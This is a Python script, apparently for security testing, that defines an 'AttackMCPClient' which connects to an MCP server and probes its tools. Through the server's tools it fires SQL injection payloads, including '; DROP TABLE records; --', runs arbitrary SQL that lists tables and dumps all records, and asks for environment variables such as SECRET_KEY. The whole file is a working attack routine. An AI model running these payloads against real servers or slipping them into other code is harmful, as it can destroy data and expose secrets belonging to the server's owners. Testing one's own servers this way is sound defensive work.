import asyncio
from typing import Optional
from contextlib import AsyncExitStack
from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client
import sys

class AttackMCPClient:
    def __init__(self):
        self.session: Optional[ClientSession] = None
        self.exit_stack = AsyncExitStack()

    async def connect_to_server(self, server_script_path: str):
        is_python = server_script_path.endswith('.py')
        is_js = server_script_path.endswith('.js')
        if not (is_python or is_js):
            raise ValueError("Server script must be a .py or .js file")
        command = "python" if is_python else "node"
        server_params = StdioServerParameters(
            command=command,
            args=[server_script_path],
            env=None
        )
        stdio_transport = await self.exit_stack.enter_async_context(stdio_client(server_params))
        self.stdio, self.write = stdio_transport
        self.session = await self.exit_stack.enter_async_context(ClientSession(self.stdio, self.write))
        await self.session.initialize()
        print("Connected to server.")

    async def test_sql_injection(self):
        print("[*] Testing SQL Injection...")
        payloads = [
            "test');--",
            "test'--",
            "' OR 1=1 --",
            "' OR '1'='1",
            "test', 'malicious');--",
            "; DROP TABLE records; --",
        ]
        for payload in payloads:
            print(f"Trying payload: {payload}")
            try:
                result = await self.session.call_tool("insert_record", {"name": payload, "address": "123 Exploit St"})
                print(f"Result: {getattr(result, 'content', result)}")
            except Exception as e:
                print(f"Error: {e}")

    async def test_arbitrary_sql_execution(self):
        print("\n[*] Testing Arbitrary SQL Execution...")
        queries = [
            "SELECT sqlite_version();",
            "SELECT name FROM sqlite_master WHERE type='table';",
            "SELECT * FROM records;"
        ]
        for query in queries:
            print(f"Query: {query}")
            result = await self.session.call_tool("execute_sql", {"query": query})
            print(f"Result: {getattr(result, 'content', result)}")

    async def test_env_variable_exposure(self):
        print("\n[*] Testing Environment Variable Exposure...")
        env_vars = ["SECRET_KEY", "PATH", "USER", "USERNAME", "HOME", "TEMP", "COMSPEC", "SHELL", "PYTHONPATH"]
        for var in env_vars:
            print(f"Env var: {var}")
            result = await self.session.call_tool("get_env_variable", {"var_name": var})
            content = getattr(result, 'content', result)
            print(f"Result: {content}")

    async def cleanup(self):
        await self.exit_stack.aclose()

async def main():
    if len(sys.argv) < 2:
        print("Usage: python attack-mcp-client.py <path_to_server_script>")
        sys.exit(1)
    client = AttackMCPClient()
    try:
        await client.connect_to_server(sys.argv[1])
        await client.test_sql_injection()
        await client.test_arbitrary_sql_execution()
        await client.test_env_variable_exposure()
    finally:
        await client.cleanup()

if __name__ == "__main__":
    asyncio.run(main())